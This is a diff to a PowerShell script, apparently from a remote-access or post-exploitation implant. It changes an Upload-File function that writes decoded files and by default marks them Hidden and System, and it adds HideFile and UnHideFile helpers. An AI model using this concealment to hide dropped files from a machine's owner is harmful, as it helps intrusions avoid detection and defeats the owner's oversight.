@@ -513,20 +513,47 @@ function Upload-File
     param
     (
         [string] $Base64,
-        [string] $Destination
+        [string] $Destination,
+        [bool] $NotHidden = $false
     )
     try {
-    write-output "Uploaded file as HIDDEN & SYSTEM to: $Destination"
-    write-output "Run Get-ChildItem -Force to view the uploaded files"
-    $fileBytes = [Convert]::FromBase64String($Base64)
-    [io.file]::WriteAllBytes($Destination, $fileBytes)
-    $file = Get-Item $Destination -Force
-    $attrib = $file.Attributes
-    $attrib = "Hidden,System"
-    $file.Attributes = $attrib  
+
+        if ($NotHidden -eq $true) {
+
+            write-output "Uploaded file to: $Destination"
+            $fileBytes = [Convert]::FromBase64String($Base64)
+            [io.file]::WriteAllBytes($Destination, $fileBytes)
+
+        } else {
+
+            write-output "Uploaded file as HIDDEN & SYSTEM to: $Destination"
+            write-output "Run Get-ChildItem -Force to view the uploaded files"
+            $fileBytes = [Convert]::FromBase64String($Base64)
+            [io.file]::WriteAllBytes($Destination, $fileBytes)
+            $file = Get-Item $Destination -Force
+            $attrib = $file.Attributes
+            $attrib = "Hidden,System"
+            $file.Attributes = $attrib  
+        
+        }
+
     } catch {
-    echo $error[0]
+
+        echo $error[0]
+
     }  
+}
+Function UnHideFile ($file) {
+    $f = Get-Item "$file" -Force
+    $a = $f.Attributes
+    $a = "Normal"
+    $f.Attributes = $a
+}
+Function HideFile ($file) {
+    $f = Get-Item "$file" -Force
+    $a = $f.Attributes
+    $a = "Hidden,System"
+    $f.Attributes = $a
 }
 function Resolve-PathSafe
 {
